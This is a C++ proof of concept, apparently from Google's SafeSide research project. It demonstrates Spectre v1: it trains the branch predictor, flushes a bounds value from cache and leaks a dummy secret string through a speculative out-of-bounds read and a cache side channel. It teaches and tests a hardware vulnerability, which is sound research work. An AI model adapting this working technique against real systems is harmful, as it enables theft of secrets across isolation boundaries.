/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks
//
const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
  // The size needs to be unloaded from cache to force speculative execution
  // to guess the result of comparison.
  //
  // TODO: since size_in_heap is no longer the only heap-allocated value, it
  // should be allocated into its own unique page
  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
      new size_t(strlen(data)));

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();
    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    int safe_offset = run % strlen(data);

    // Loop length must be high enough to beat branch predictors.
    // The current length 2048 was established empirically. With significantly
    // shorter loop lengths some branch predictors are able to observe the
    // pattern and avoid branch mispredictions.
    for (size_t i = 0; i < 2048; ++i) {
      // Remove from cache so that we block on loading it from memory,
      // triggering speculative execution.
      CLFlush(size_in_heap.get());

      // Train the branch predictor: perform in-bounds accesses 2047 times,
      // and then use the out-of-bounds offset we _actually_ care about on the
      // 2048th time.
      // The local_offset value computation is a branchless equivalent of:
      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
      // We need to avoid branching even for unoptimized compilation (-O0).
      // Optimized compilations (-O1, concretely -fif-conversion) would remove
      // the branching automatically.
      size_t local_offset =
          offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);

      if (local_offset < *size_in_heap) {
        // This branch was trained to always be taken during speculative
        // execution, so it's taken even on the 2048th iteration, when the
        // condition is false!
        ForceRead(isolated_oracle.data() + static_cast<size_t>(
            data[local_offset]));
      }
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
